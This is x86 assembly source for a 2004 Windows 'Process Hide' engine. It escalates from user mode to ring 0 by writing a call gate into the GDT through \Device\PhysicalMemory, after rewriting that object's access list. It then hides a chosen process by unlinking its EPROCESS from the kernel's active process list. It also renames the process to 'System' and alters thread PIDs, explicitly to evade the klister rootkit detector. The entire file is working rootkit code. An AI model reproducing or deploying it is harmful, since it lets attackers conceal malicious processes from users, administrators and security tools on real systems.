;
;  PROJECT:         Process Hide
;  FILE:            phide.inc
;  PURPOSE:         main engine code
;  VERSION:         1.0
;
;  PROGRAMMER:      90210//HI-TECH
;
;
;
; History:
;	2004/01/25 90210 initial release
;


.586p
.model          flat,STDCALL

include		incs\phide.ash
include		incs\internal.ash
include		incs\pe.inc
include		incs\mz.inc

public		ProcessHide

.code

include		incs\catchy32.inc


dwDesiredAccess		EXPLICIT_ACCESS	<SECTION_MAP_WRITE,\
					GRANT_ACCESS,\
					NO_INHERITANCE,\
					0,NO_MULTIPLE_TRUSTEE,TRUSTEE_IS_NAME,TRUSTEE_IS_USER,offset uniCurrent_user>

uniCurrent_user:	unicode	0,<CURRENT_USER>,0

align 4
PhysMemName:		unicode	0,<\Device\PhysicalMemory>,0
PhysMemNamelen=$-PhysMemName
uniPhysMemName		UNICODE_STRING <PhysMemNamelen-2,PhysMemNamelen,offset PhysMemName>

align 4
ObjectAttributes	OBJECT_ATTRIBUTES  <size OBJECT_ATTRIBUTES,0,offset uniPhysMemName,OBJ_CASE_INSENSITIVE,0,0>

aMmIsAddressValid	db	'MmIsAddressValid',0
aSystem		db	'System',0		; put this as new image name when
						; PH_CHANGE_THREADS_PID flag is set

oNT4		EP_ET_OFFSETS_dw	<098h,094h,1dch,000h,50h,1e0h,1a4h>
o2k		EP_ET_OFFSETS_dw	<0a0h,09ch,1fch,000h,50h,1e0h,1a4h>
oXP		EP_ET_OFFSETS_dw	<088h,084h,174h,1f4h,50h,1ech,1b0h>
o2k3		EP_ET_OFFSETS_dw	<088h,084h,154h,1d4h,50h,1ach,1f4h>

ProcessHide	proc	dwProcess2Hide:DWORD,dwFlags:DWORD,pNewImgName:DWORD,ppEPROCESS:DWORD

		local	pPAPH:DWORD
		local	pNtoskrnl:DWORD
		local	hFileMappingObject:DWORD
		local	SymbolicLinkHandle:DWORD
		local	pSystemModuleInfo:DWORD
		local	NewAcl:DWORD
		local	pDacl:DWORD
		local	pSecurityDescriptor:DWORD
		local	dwNtoskrnlIBase:DWORD
		local	pNameAndOffsets:DWORD	; new image name and undoc offsets, which are
						; different in nt/2k/xp
		uses	ebx,esi,edi

		push	offset xHandler
		push	dword ptr fs:[0]
		mov	dword ptr fs:[0],esp

		and	dword ptr [hFileMappingObject],0
		and 	dword ptr [pSystemModuleInfo],0

		call	VirtualAlloc,0,4096,MEM_COMMIT,PAGE_READWRITE
		push	PH_ERR_NOT_ENOUGH_MEMORY
		or	eax,eax
		jz	exit
		pop	ecx
		mov	pNameAndOffsets,eax

		mov	eax,ppEPROCESS
		or	eax,eax
		jz	skip_init_ppEP
		and	dword ptr [eax],0

skip_init_ppEP:	mov	esi,pNewImgName
		test	dwFlags,PH_CHANGE_THREADS_PID
		jz	set_user_name
		or	dwFlags,PH_CHANGE_IMGNAME
		lea	esi,aSystem		; set 'System' as process name for stealth reasons
set_user_name:
		or	esi,esi
		jz	skip_init_pNIN

		push	esi
		cld
		xor	ecx,ecx
next_char:	lodsb
		inc	ecx
		cmp	cl,16
		jae	got_len
		or	al,al
		jnz	next_char
got_len:	pop	esi

		mov	edi,pNameAndOffsets
;		lea	edi,[edi.szNewImageFileName]	; lea edi,[edi] removed
		rep	movsb
		jmp	name_stored

skip_init_pNIN:	push	PH_ERR_MUST_SPECIFY_NAME
		test	dwFlags,PH_CHANGE_IMGNAME	; pNewImgName==NULL 
							; but PH_CHANGE_IMGNAME flag set
		jnz	exit
		pop	ecx
name_stored:	

; copy appropriate EPROCESS and ETHREAD offsets into small structure for using by r0 code
; (these offsets depend on OS version)
		mov	ebx,size OSVERSIONINFO
		sub	esp,ebx
		mov	[esp],ebx
		call	GetVersionExA,esp
		or	eax,eax
		jnz	got_version
; bug?!
		add	esp,ebx
		push	PH_ERR_GENERAL
		jmp	exit
got_version:

		mov	eax,[esp.dwMajorVersion]
		mov	edx,[esp.dwMinorVersion]
		add	esp,ebx

		push	PH_ERR_OS_NOT_SUPPORTED

		mov	edi,pNameAndOffsets
		lea	edi,[edi.offs]
		lea	esi,oNT4			; NT offs are the first in offsets array
		push	7				; number of elements in EP_ET_OFFSETS_*
		pop	ecx

		cmp	eax,4
		je	copy_offsets			; NT4 and below
		jb	exit				; oses below - not supported :)

		lea	esi,[esi+ecx*2]
		or	edx,edx
		jz	copy_offsets			; 2k

		cmp	edx,2				; 2k3?
		jb	xp
		ja	exit				; 5.x>2 not supported

		lea	esi,[esi+ecx*2]			; 2k3
xp:		lea	esi,[esi+ecx*2]			; xp
copy_offsets:	lodsw
		stosd					; expand words to dwords
		loop	copy_offsets

		pop	eax

; let's find ntoskrnl base
		mov	esi,100000h
realloc:	call	VirtualAlloc,0,esi,MEM_COMMIT,PAGE_READWRITE
		push	PH_ERR_NOT_ENOUGH_MEMORY
		or	eax,eax
		jz	exit
		pop	ecx
		mov	ebx,eax

		push	eax
		call	NtQuerySystemInformation,SystemModuleInformation,ebx,esi,esp
		pop	ecx			; can't rely on ReturnLength :(
		or	eax,eax
		jz	got_modules
		
		push	PH_ERR_CANT_FIND_NTOSKRNL
		cmp	eax,STATUS_INFO_LENGTH_MISMATCH
		jnz	exit			; NQSI returned something other than 'bad length'?
		pop	edx

		shl	esi,1
		call	VirtualFree,ebx,0,MEM_RELEASE
		jmp	realloc

got_modules:	mov 	pSystemModuleInfo,ebx	; store pointer for later usage (LoadLibrary)

		mov	eax,[4+ebx.smi_Base]	; get ntoskrnl imagebase
		mov	pNtoskrnl,eax

		push	PH_ERR_CANT_LOCK_PAGES
		call	VirtualLock,offset r0proc,r0procsize	; lock r0 code to avoid page fault
		or	eax,eax
		jz	exit
		call	VirtualLock,pNameAndOffsets,100
		or	eax,eax
		jz	exit
		pop	eax

                lea	ebx,hFileMappingObject
		and	dword ptr [ebx],0
		lea	edi,ObjectAttributes

		xor	esi,esi
		call	NtOpenSection,ebx,SECTION_MAP_WRITE,edi
		or	eax,eax
		jz	good

		call	NtOpenSection,ebx,READ_CONTROL or WRITE_DAC,edi
		push	PH_ERR_CANT_OPEN_SECTION
		or	eax,eax
		jnz	exit
		pop	ecx

		lea	eax,pDacl
		lea	ecx,pSecurityDescriptor
		call	GetSecurityInfo,dword ptr [ebx],\
					SE_KERNEL_OBJECT,\
					DACL_SECURITY_INFORMATION,\
					esi,\
					esi,\
					eax,\
					esi,\
					ecx
		or	eax,eax
		jnz	cantgetdacl

		lea	eax,NewAcl
		call	SetEntriesInAclW,1,offset dwDesiredAccess,pDacl,eax
		or	eax,eax
		jnz	cantsetacl

		call	SetSecurityInfo,dword ptr [ebx],\
					SE_KERNEL_OBJECT,\
					DACL_SECURITY_INFORMATION,\
					esi,\
					esi,\
					NewAcl,\
					esi
		call	LocalFree,NewAcl
cantsetacl:
		call	LocalFree,pSecurityDescriptor
cantgetdacl:
                call	CloseHandle,dword ptr [ebx]

		call	NtOpenSection,ebx,SECTION_MAP_WRITE,edi
		push	PH_ERR_CANT_OPEN_SECTION
		or	eax,eax
		jnz	exit			; failed to set write permissions...
		pop	ecx
good:

; \Device\PhysicalMemory has been successfully opened, ready for mapping.
; Let's find non-exported PsActiveProcessHead now.

		mov	esi,pSystemModuleInfo
		movzx	eax,[4+esi.smi_ModuleNameOffset]
		lea	eax,[4+eax+esi.smi_ImageName]	; get ntoskrnl name (it may be overriden
							; with "/kernel=" parameter in boot.ini)

		call	LoadLibraryExA,eax,0,DONT_RESOLVE_DLL_REFERENCES
		push	PH_ERR_CANT_LOAD_NTOSKRNL
		or	eax,eax
		jz	exit

		mov	esi,eax
		mov	edi,eax

		call	GetProcAddress,eax,offset aMmIsAddressValid
		or	eax,eax
		jz	exit			; exit with PH_ERR_CANT_LOAD_NTOSKRNL
		pop	ecx

		mov	edx,pNameAndOffsets
		sub	eax,esi			; eax=rva of MmIsAddressValid
		add	eax,pNtoskrnl		; eax=real address of MmIsAddressValid
		mov	[edx.pMmIsAddressValid],eax

		mov	ecx,[esi.MZ_lfanew]
		add	ecx,esi
		mov	eax,[ecx.NT_OptionalHeader.OH_ImageBase]
		mov	dwNtoskrnlIBase,eax
		mov	ecx,[ecx.NT_OptionalHeader.OH_SizeOfImage]
		add	ecx,esi

; 1. search for 
;   		68 50 41 47 45		push 'EGAP'
; 2. if found, check 100 opcodes after that push for 
;		C7 4? 04 44 55 4D 50	mov dword ptr [reg32+4], 'PMUD'
; 3. if found, check other 100 opcodes for 
;		C7 4? 1C ?? ?? ?? ??	mov dword ptr [reg32+1Ch], offset PsActiveProcessHead
; and get PsActiveProcessHead offset.
                push	PH_ERR_CANT_FIND_PAPH
nextdword:	
		cmp	esi,ecx
		jae	exit

		lodsd
		sub	esi,3
		cmp	eax,47415068h
		jnz	nextdword
		cmp	byte ptr [esi+3],45h
		jnz	nextdword
		dec	esi

; push 'EGAP' found at esi, disasm code after it
                mov	cl,4
		call	find_pMOV_reg32_imm32	; search for mov [reg32+4],imm32
		jc	exit
		cmp	eax,'PMUD'
		jnz	exit			; bizarre version of ntoskrnl
						; or ms changed minidump file format...
		mov	cl,1ch
		call	find_pMOV_reg32_imm32	; search for mov [reg32+1ch],imm32
		jc	exit

		pop	ecx			; clean up stack after 'push PH_ERR_CANT_FIND_PAPH'

;		sub	eax,edi			; mapped ntosrknl base
		sub	eax,dwNtoskrnlIBase	; ntoskrnl preferred ibase
						; LoadLibraryEx(,,DONT_RESOLVE_DLL_REFERENCES)
						; also doesn't fix relo items...
		add	eax,pNtoskrnl		; real ntoskrnl base
		mov	pPAPH,eax		; save PAPH offset
; got PsActiveProcessHead offset in eax :)


; install call gate r3->r0
		push	eax
		push	eax
		sgdt	[esp+2]
		pop	ecx
		pop	esi			; GDT.Base
		shr	ecx,16			; GDT.Limit
		
		cmp	esi,80000000h
		jb	_4kb
		cmp	esi,0a0000000h
		jae	_4kb
		
		and	esi,0ffff000h
		jmp	got_phys
_4kb:		
		and	esi,1ffff000h
got_phys:
		push	ecx			; GDT.Limit
		sub	esp,size SYSTEM_INFO
		call	GetSystemInfo,esp
		mov	eax,[esp.dwAllocationGranularity]
		add	esp,size SYSTEM_INFO

		push	eax			; virtual memory allocation granularity
; try to map PhysicalMemory with align=0x1000 and do shl align,1 if MapSection fails 
; until align>SYSTEM_INFO.dwAllocationGranularity:
; for (align=0x1000;(align<=SYSTEM_INFO.dwAllocationGranularity)&&(!MapSection());align<<=1) {}
		push	1000h			; granularity to start from
		push	esi

try_new_granularity:
		mov	eax,[esp+4]		; current granularity
		dec	eax
		mov	ecx,[esp+0ch]		; GDT.Limit
		add	ecx,eax
		not	eax
		and	ecx,eax			; ecx=Align(GDT.Limit, dwGranularity)

		mov	esi,[esp]		; GDT.Base physaddr
		mov	edi,esi
		and	esi,eax			; align mapping address
		sub	edi,esi			; get granularity offset

		push	ecx			; aligned mapping size
		call	MapSection,dword ptr [ebx],esi,esp
		pop	ecx
		or	eax,eax
		jnz	map_succeeded

		mov	eax,[esp+4]		; current granularity
		shl	eax,1
		mov	[esp+4],eax		; save increased value
		cmp	eax,[esp+8]		; SYSTEM_INFO.dwAllocationGranularity
		jbe	try_new_granularity

		add	esp,10h
		push	PH_ERR_CANT_MAP_SECTION	; all reasonable granularity values tried...
		jmp	exit			; report about mapping failure

map_succeeded:	add	esp,0ch
		pop	ecx			; GDT.Limit

		mov	esi,eax
		add	edi,eax			; recalc GDT base offset due to aligning
		lea	edx,[edi+8]		; edx=gdt start

		inc	ecx
		and	ecx,0fff8h
		add	edi,ecx			; esi=gdt end + 8, 8-aligned

		push	PH_ERR_CANT_FIND_FREE_DESCRIPTOR
find_free_descriptor:
		cmp	edi,edx
		jb	exit			; can't find free descriptor
		sub	edi,8
		mov	al,[edi+5]
		and	al,80h			; does descriptor present (bit P set)?
		jnz	find_free_descriptor
		pop	eax			; clean up stack

		fild	qword ptr [edi]
		push	esi
		push	edi
		cld

		push	offset r0proc
		pop	ax			; dst offset 0..15
		stosw
		mov	eax,0ec000008h		; code32, dpl=0
						; word count=0
						; type=0ch (386+ call gate)
						; dpl=3
						; p=1
		stosd
		pop	ax			; dst offset 16..31
		stosw

; call gate installed, call it
		sub	edi,edx			; selector number in edi
		shl	edi,8
		add	edi,0c3000000h
		push	edi
		push	9ah
; now on the stack:
; call <sel>:0
; ret
		mov	edx,dwProcess2Hide
		mov	ebx,dwFlags
		mov	esi,pPAPH
		mov	ecx,pNameAndOffsets

		mov	eax,esp
; let's r0ck
		call	eax			; cant do call esp+4 :)
		pop	ecx			; add esp,8
		pop	ecx

		pop	edi
		pop	esi
		fistp	qword ptr [edi]

		call	UnmapSection,esi

		mov	edi,ppEPROCESS
		or	edi,edi
		jz	skip_set_EP
		mov	[edi],eax
skip_set_EP:

		or	eax,eax			; returned value from r0 code
		jnz	good_exit		; process found
		push	PH_ERR_PROCESS_NOT_FOUND
		jmp	exit
good_exit:
		push	0			; no error
		jmp	exit

seh_error:	push	PH_ERR_GENERAL

exit:		pop	esi			; error code
		mov	ebx,hFileMappingObject
		or	ebx,ebx
		jz	skip_ch
		call	CloseHandle,ebx
skip_ch:
		mov 	ebx,pSystemModuleInfo
		or	ebx,ebx
		jz	skip_vf1
		call	VirtualFree,ebx,0,MEM_RELEASE
skip_vf1:
		mov	edi,pNameAndOffsets
		or	edi,edi
		jz	skip_vf2
		call	VirtualUnlock,edi,100
		call	VirtualFree,edi,0,MEM_RELEASE
skip_vf2:
		call	VirtualUnlock,offset r0proc,r0procsize
		pop	dword ptr fs:[0]
		pop	eax

		mov	eax,esi
		ret
ProcessHide	endp

xHandler	proc	pExcept:DWORD,pFrame:DWORD,pContext:DWORD,pDispatch:DWORD
		mov	eax,pContext
		mov	[eax.regEip],offset seh_error
		xor	eax,eax
		ret
xHandler	endp

r0proc:
;edx=dwProcess2Hide
;esi=pPAPH
;ebx=dwFlags
;ecx=pNameAndOffsets
		push	offset xR0Handler
		push	dword ptr fs:[0]
		mov	dword ptr fs:[0],esp

		cli
		pushad
		pushf

		and	dword ptr [4+esp.Pushad_eax],0
		mov	ebp,ecx			; save pNameAndOffsets

		test	ebx,PH_PROCESS_BY_EPROCESS
		jz	by_pid
; EPROCESS already known, get pid and jump to thread management		
		call	CheckRW,edx		; is supplied EPROCESS pointer valid?
		mov	esi,edx			; EPROCESS
		jc	processes_enumerated

		mov	edx,[ebp.offs.EP_UniqueProcessId]	; ebp=pNameAndOffsets
		mov	eax,[esi+edx]
		mov	[4+esp.Pushad_edx],eax	; store pid
		jmp	return_eprocess

by_pid:
; find process by its pid
		call	CheckRW,esi		; lame check for PAPH offset validity
		jc	processes_enumerated

		mov	edi,esi
		mov	esi,dword ptr [esi]	; esi=PAPH

next_process:	cmp	edi,esi
		jz	processes_enumerated
		sub	esi,[ebp.offs.EP_ActiveProcessLinks]
		call	CheckRW,esi
		jc	processes_enumerated

		mov	edx,[ebp.offs.EP_UniqueProcessId]
		mov	eax,[esi+edx]		; EPROCESS.UniqueProcessId
		cmp	eax,[4+esp.Pushad_edx]	; dwProcess2Hide (PID)
		jnz	not_needed

; EPROCESS of selected process found (esi).
return_eprocess:
		mov	[4+esp.Pushad_eax],esi	; return EPROCESS pointer

		test	ebx,PH_CHANGE_IMGNAME	; should we change image name?
		jz	check_change_threads

		push	esi
		mov	edx,[ebp.offs.EP_ImageFileName]

		or	edx,edx
		jz	nooffset

		lea	edi,[edx+esi]		; MyProcess.ImageFileName
;		lea	esi,[ebp.szNewImageFileName]	; ebp+0 :)
		mov	esi,ebp
		push	4
		pop	ecx
		rep	movsd			; change image name

nooffset:
		push	eax			; sub esp,4

		mov	eax,[ebp.offs.EP_SAPCI_ImageFileName]
		or	eax,eax
		jz	not_xp			; only for xp and above systems

		add	eax,[esp+4]		; eax=&(EPROCESS.SE_AUDIT_PROCESS_CREATION_INFO.ImageFileName)
		call	CheckRW,eax
		jc	not_xp			; bad pointer

		mov	eax,[eax]		; ImageFileName offset
		call	CheckRW,eax
		jc	not_xp			; bad pointer

		mov	[esp],eax		; save PUNICODE_STRING

		movzx	ecx,word ptr [eax]	; UNICODE_STRING.Length
		mov	edi,dword ptr [eax+4]	; esi=UNICODE_STRING.Buffer
		call	CheckRW,edi
		jc	not_xp

		add	edi,ecx
		mov	edx,edi			; edx=image name end

		std
		push	'\'
		pop	eax
		shr	ecx,1

		repne	scasw			; find start of the process filename
		or	ecx,ecx
		jz	not_xp			; path not found..

		add	edi,4			; edi=process image file name start
		mov	esi,ebp
		
		sub	edx,edi
		mov	ecx,edx
		shr	ecx,1
		cld

copy_next_word:	lodsb
		stosw				; patch real filename with user supplied name
		or	al,al
		jz	end_copy
		loop	copy_next_word
end_copy:	or	ecx,ecx
		jz	not_xp			; supplied image name is too long, truncated
		
		mov	eax,[esp]		; eax=ImageFileName UNICODE_STRING start
		sub	word ptr [eax],cx	; decrease UNICODE_STRING.Length
		sub	word ptr [eax+2],cx	; decrease UNICODE_STRING.MaximumLength

not_xp:		pop	eax			; add esp,4
		pop	esi			; esi=pEPROCESS

check_change_threads:
		and	ebx,PH_CHANGE_THREADS_PID	; should we patch UniquePid for each 
							; process thread?
		jz	all_threads

; change ProcessId in all process' threads to hide it from klister -
; this possibly disconnects threads from win32k, so be careful with it.
		mov	edx,[ebp.offs.EP_Pcb_ThreadListHead]
		mov	ebx,[esi+edx]

		mov	eax,ebx

next_thread:	call	CheckRW,ebx
		jc	all_threads		; bad ThreadListEntry

		cmp	eax,[ebx]		; skip last ETHREAD(???)
		jz	all_threads

		sub	ebx,[ebp.offs.ET_Tcb_ThreadListEntry]	; set ebx to ETHREAD start
		mov	edi,[ebp.offs.ET_Cid_UniqueProcess]
		mov	edx,[4+esp.Pushad_edx]	; dwProcess2Hide
		cmp	[ebx+edi],edx		; ETHREAD.Cid.UniqueProcess matches dwProcess2Hide?
		jnz	alien_thread
		push	8
		pop	dword ptr [ebx+edi]	; obfuscate real PID
alien_thread:
		mov	edx,[ebp.offs.ET_Tcb_ThreadListEntry]
		mov	ebx,[ebx+edx]
		or	ebx,ebx
		jnz	next_thread
all_threads:

		mov	ebx,[4+esp.Pushad_ebx]	; restore ebx=dwFlags
		and	ebx,PH_EXCLUDE_EPROCESS	; should we hide EPROCESS or just return pointer?
		jz	processes_enumerated

; exclude this EPROCESS from the list
		mov	edx,[ebp.offs.EP_ActiveProcessLinks]
		lea	ebx,[esi+edx]
		mov	eax,[ebx]		; EPROCESS.ActiveProcessLink.Flink
		mov	ecx,[ebx+4]		; EPROCESS.ActiveProcessLink.Blink

		call	CheckRW,eax
		jc	cant_write
		call	CheckRW,ecx
		jc	cant_write

		cmp	[ecx],ebx
		jnz	processes_enumerated	; already hidden
		cmp	[eax+4],ebx
		jnz	processes_enumerated    ; already hidden

		mov	[ecx],eax		; patch Flink->..->Flink
		mov	[eax+4],ecx		; patch Flink<-..<-Blink

		jmp	processes_enumerated

not_needed:	mov	edx,[ebp.offs.EP_ActiveProcessLinks]
		mov	esi,dword ptr [esi+edx]
		jmp	next_process

cant_write:	and	dword ptr [4+esp.Pushad_eax],0	; return error

processes_enumerated:
		popf
		popad
		sti

		pop	dword ptr fs:[0]
		pop	ecx
		retf

CheckRW:	pushad
		call	[ebp.pMmIsAddressValid],dword ptr [esp+cPushad+4]
		clc
		or	eax,eax
		jnz	goodmem			; must lock pages and check for nonpaged pool, 
						; but again, this is not a heavy-armored code ;)
		stc
goodmem:	popad
		ret	4

xR0Handler	proc	pExcept:DWORD,pFrame:DWORD,pContext:DWORD,pDispatch:DWORD
		mov	eax,pContext
		mov	[eax.regEip],offset processes_enumerated
		xor	eax,eax
		ret
xR0Handler	endp

r0procsize=$-r0proc

;;;;;;;
;;in:   esi = pointer to opcode
;;      cl  = offset8
;;out:  eax = imm32, esi = poiter to opcode and CF set - if mov [reg32+offset8],imm32 found
;;      eax, esi trashed, CF reset - otherwise
;;
;;trashed: edx
;;note: this routine checks only 100 instructions
;;;;;;;
find_pMOV_reg32_imm32:
		push	edi
		mov	dx,-1
		mov	dl,cl
		shl	edx,16
		mov	dx,04FC7h
		
		push	100
		pop	ecx

next_opcode:	call	c_Catchy

		mov	edi,dword ptr [esi]
		or	edi,0FF000F00h  ; C7 4? 04 ??
		cmp	edi,edx
		jnz	_2loop
		mov	eax,dword ptr [esi+3]
		pop	edi
		clc
		ret

_2loop:		add	esi,eax
		loop	next_opcode
		pop	edi
		stc
		ret

MapSection	proc	hSect:DWORD,Address:DWORD,pLength:DWORD
		local	va:DWORD
		local	pa[2]:DWORD
		uses	esi,edi

		lea	esi,va
		lea	edi,pa
		mov	eax,pLength
		push	Address
		pop	dword ptr [edi]


		and	dword ptr [edi+4],0
		and	dword ptr [esi],0
		
		call	NtMapViewOfSection,hSect,\
						-1,\
						esi,\
						0,\
						dword ptr [eax],\
						edi,\
						eax,\
						ViewShare,\
						0,\
						PAGE_READWRITE
		or	eax,eax
		jnz	badexit
		mov	eax,dword ptr [esi]
		jmp	goodexit
badexit:	xor	eax,eax
goodexit:	ret
MapSection	endp

UnmapSection	proc	Address:DWORD
		push	eax
		call	NtUnmapViewOfSection,-1,Address
		pop	eax
		ret
UnmapSection	endp
end